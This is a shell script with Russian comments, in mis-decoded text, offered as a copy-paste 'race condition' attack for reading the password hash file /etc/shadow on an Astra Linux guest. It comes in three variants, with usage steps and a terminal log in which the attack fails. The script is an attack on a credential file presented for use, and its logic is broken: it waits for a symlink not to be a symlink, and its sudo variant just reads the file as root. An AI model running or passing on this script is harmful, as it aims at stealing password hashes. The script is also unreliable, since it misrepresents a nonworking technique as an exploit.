# üéØ –û–î–ù–ê –ö–û–ú–ê–ù–î–ê –ë–ï–ó GCC (–§–ò–ù–ê–õ–¨–ù–ê–Ø): Race Condition –∞—Ç–∞–∫–∞ –¥–ª—è —á—Ç–µ–Ω–∏—è /etc/shadow
# –°–∫–æ–ø–∏—Ä—É–π—Ç–µ –∏ –≤—Å—Ç–∞–≤—å—Ç–µ —ç—Ç—É –∫–æ–º–∞–Ω–¥—É –≤ —Ç–µ—Ä–º–∏–Ω–∞–ª:

echo "üöÄ RACE CONDITION –ë–ï–ó GCC (–§–ò–ù–ê–õ–¨–ù–ê–Ø)" && echo "=== –î–ò–ê–ì–ù–û–°–¢–ò–ö–ê ===" && echo "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: $(whoami)" && echo "UID: $(id -u)" && echo "–ü—Ä–∞–≤–∞ /etc/shadow: $(ls -la /etc/shadow 2>/dev/null || echo '–§–∞–π–ª –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')" && echo "=== –ó–ê–ü–£–°–ö –ê–¢–ê–ö–ò ===" && rm -f /tmp/race_symlink /tmp/race_success.txt && echo "test" > /tmp/race_target && (for i in {1..20000}; do rm -f /tmp/race_symlink; ln -sf /etc/shadow /tmp/race_symlink; done) & (for i in {1..20000}; do if [ -f /tmp/race_symlink ] && [ ! -L /tmp/race_symlink ]; then if head -1 /tmp/race_symlink 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) && wait && echo "‚úÖ –ê—Ç–∞–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!" && if [ -f /tmp/race_success.txt ]; then echo "üîç –°–û–î–ï–†–ñ–ò–ú–û–ï –ü–†–û–ß–ò–¢–ê–ù–ù–û–ì–û –§–ê–ô–õ–ê /etc/shadow:"; echo "============================================================"; cat /tmp/race_success.txt; echo "============================================================"; else echo "‚ùå –ê—Ç–∞–∫–∞ –Ω–µ —É–¥–∞–ª–∞—Å—å"; echo ""; echo "üîç –î–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–∞:"; echo "–ü–æ–ø—ã—Ç–∫–∞ –ø—Ä—è–º–æ–≥–æ —á—Ç–µ–Ω–∏—è: $(head -3 /etc/shadow 2>/dev/null || echo '–ü—Ä—è–º–æ–µ —á—Ç–µ–Ω–∏–µ –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —Å sudo: $(sudo head -3 /etc/shadow 2>/dev/null || echo 'Sudo –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; fi && rm -f /tmp/race_target /tmp/race_symlink

# =============================================================================
# –í–ï–†–°–ò–Ø –° SUDO (–µ—Å–ª–∏ –¥–æ—Å—Ç—É–ø–µ–Ω):
# =============================================================================

echo "üöÄ RACE CONDITION –ë–ï–ó GCC (–° SUDO)" && sudo bash -c 'echo "=== –î–ò–ê–ì–ù–û–°–¢–ò–ö–ê ===" && echo "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: $(whoami)" && echo "UID: $(id -u)" && echo "–ü—Ä–∞–≤–∞ /etc/shadow: $(ls -la /etc/shadow 2>/dev/null || echo "–§–∞–π–ª –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω")" && echo "=== –ó–ê–ü–£–°–ö –ê–¢–ê–ö–ò ===" && rm -f /tmp/race_symlink /tmp/race_success.txt && echo "test" > /tmp/race_target && (for i in {1..20000}; do rm -f /tmp/race_symlink; ln -sf /etc/shadow /tmp/race_symlink; done) & (for i in {1..20000}; do if [ -f /tmp/race_symlink ] && [ ! -L /tmp/race_symlink ]; then if head -1 /tmp/race_symlink 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) && wait && echo "‚úÖ –ê—Ç–∞–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!" && if [ -f /tmp/race_success.txt ]; then echo "üîç –°–û–î–ï–†–ñ–ò–ú–û–ï –ü–†–û–ß–ò–¢–ê–ù–ù–û–ì–û –§–ê–ô–õ–ê /etc/shadow:"; echo "============================================================"; cat /tmp/race_success.txt; echo "============================================================"; else echo "‚ùå –ê—Ç–∞–∫–∞ –Ω–µ —É–¥–∞–ª–∞—Å—å"; fi && rm -f /tmp/race_target /tmp/race_symlink'

# =============================================================================
# –°–ê–ú–ê–Ø –ü–†–û–°–¢–ê–Ø –í–ï–†–°–ò–Ø (–±–µ–∑ –¥–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–∏):
# =============================================================================

echo "üöÄ RACE CONDITION –ë–ï–ó GCC (–ü–†–û–°–¢–ê–Ø)" && rm -f /tmp/race_symlink /tmp/race_success.txt && echo "test" > /tmp/race_target && (for i in {1..25000}; do rm -f /tmp/race_symlink; ln -sf /etc/shadow /tmp/race_symlink; done) & (for i in {1..25000}; do if [ -f /tmp/race_symlink ] && [ ! -L /tmp/race_symlink ]; then if head -1 /tmp/race_symlink 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) && wait && echo "‚úÖ –ê—Ç–∞–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!" && if [ -f /tmp/race_success.txt ]; then echo "üîç –°–û–î–ï–†–ñ–ò–ú–û–ï –ü–†–û–ß–ò–¢–ê–ù–ù–û–ì–û –§–ê–ô–õ–ê /etc/shadow:"; echo "============================================================"; cat /tmp/race_success.txt; echo "============================================================"; else echo "‚ùå –ê—Ç–∞–∫–∞ –Ω–µ —É–¥–∞–ª–∞—Å—å"; fi && rm -f /tmp/race_target /tmp/race_symlink

# =============================================================================
# –ò–ù–°–¢–†–£–ö–¶–ò–ò –î–õ–Ø VIRTUALBOX ASTRA LINUX:
# =============================================================================
# 1. –û—Ç–∫—Ä–æ–π—Ç–µ —Ç–µ—Ä–º–∏–Ω–∞–ª –≤ –≥–æ—Å—Ç–µ–≤–æ–π —Å–∏—Å—Ç–µ–º–µ
# 2. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–∞—á–∞–ª–∞ –≤–µ—Ä—Å–∏—é —Å –¥–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–æ–π
# 3. –ï—Å–ª–∏ –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –≤–µ—Ä—Å–∏—é —Å sudo
# 4. –ï—Å–ª–∏ sudo –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –ø—Ä–æ—Å—Ç—É—é –≤–µ—Ä—Å–∏—é
# 5. –ï—Å–ª–∏ –≤—Å–µ –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç, –≤–æ–∑–º–æ–∂–Ω–æ /etc/shadow –∑–∞—â–∏—â–µ–Ω –æ—Ç race condition
# ============================================================================= 
user@astra:~$ echo "üöÄ RACE CONDITION –ë–ï–ó GCC (–§–ò–ù–ê–õ–¨–ù–ê–Ø)" && echo "=== –î–ò–ê–ì–ù–û–°–¢–ò–ö–ê ===" && echo "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: $(whoami)" && echo "UID: $(id -u)" && echo "–ü—Ä–∞–≤–∞ /etc/shadow: $(ls -la /etc/shadow 2>/dev/null || echo '–§–∞–π–ª –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')" && echo "=== –ó–ê–ü–£–°–ö –ê–¢–ê–ö–ò ===" && rm -f /tmp/race_symlink /tmp/race_success.txt && echo "test" > /tmp/race_target && (for i in {1..20000}; do rm -f /tmp/race_symlink; ln -sf /etc/shadow /tmp/race_symlink; done) & (for i in {1..20000}; do if [ -f /tmp/race_symlink ] && [ ! -L /tmp/race_symlink ]; then if head -1 /tmp/race_symlink 2>/dev/null | grep -q "root:"; then echo "üéØ RACE CONDITION –£–°–ü–ï–®–ï–ù!"; echo "–ü—Ä–æ—á–∏—Ç–∞–Ω–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ /etc/shadow:"; echo "=================================================="; cat /tmp/race_symlink > /tmp/race_success.txt; cat /tmp/race_success.txt; echo "=================================================="; break; fi; fi; done) && wait && echo "‚úÖ –ê—Ç–∞–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!" && if [ -f /tmp/race_success.txt ]; then echo "üîç –°–û–î–ï–†–ñ–ò–ú–û–ï –ü–†–û–ß–ò–¢–ê–ù–ù–û–ì–û –§–ê–ô–õ–ê /etc/shadow:"; echo "============================================================"; cat /tmp/race_success.txt; echo "============================================================"; else echo "‚ùå –ê—Ç–∞–∫–∞ –Ω–µ —É–¥–∞–ª–∞—Å—å"; echo ""; echo "üîç –î–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–∞:"; echo "–ü–æ–ø—ã—Ç–∫–∞ –ø—Ä—è–º–æ–≥–æ —á—Ç–µ–Ω–∏—è: $(head -3 /etc/shadow 2>/dev/null || echo '–ü—Ä—è–º–æ–µ —á—Ç–µ–Ω–∏–µ –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ')"; echo "–ü–æ–ø—ã—Ç–∫–∞ —Å sudo: $(sudo head -3 /etc/shadow 2>/dev/null || echo 'Sudo –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')"; fi && rm -f /tmp/race_target /tmp/race_symlink
[1] 36770
üöÄ RACE CONDITION –ë–ï–ó GCC (–§–ò–ù–ê–õ–¨–ù–ê–Ø)
=== –î–ò–ê–ì–ù–û–°–¢–ò–ö–ê ===
–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: user
UID: 1001
–ü—Ä–∞–≤–∞ /etc/shadow: -rw-r----- 1 root shadow 1168 –∞–ø—Ä 28 12:24 /etc/shadow
=== –ó–ê–ü–£–°–ö –ê–¢–ê–ö–ò ===
[1]+  –ó–∞–≤–µ—Ä—à—ë–Ω        echo "üöÄ RACE CONDITION –ë–ï–ó GCC (–§–ò–ù–ê–õ–¨–ù–ê–Ø)" && echo "=== –î–ò–ê–ì–ù–û–°–¢–ò–ö–ê ===" && echo "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: $(whoami)" && echo "UID: $(id -u)" && echo "–ü—Ä–∞–≤–∞ /etc/shadow: $(ls -la /etc/shadow 2> /dev/null || echo '–§–∞–π–ª –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω')" && echo "=== –ó–ê–ü–£–°–ö –ê–¢–ê–ö–ò ===" && rm -f /tmp/race_symlink /tmp/race_success.txt && echo "test" > /tmp/race_target && ( for i in {1..20000};
do
    rm -f /tmp/race_symlink; ln -sf /etc/shadow /tmp/race_symlink;
done )
‚úÖ –ê—Ç–∞–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!
‚ùå –ê—Ç–∞–∫–∞ –Ω–µ —É–¥–∞–ª–∞—Å—å

üîç –î–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–∞:
–ü–æ–ø—ã—Ç–∫–∞ –ø—Ä—è–º–æ–≥–æ —á—Ç–µ–Ω–∏—è: –ü—Ä—è–º–æ–µ —á—Ç–µ–Ω–∏–µ –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ

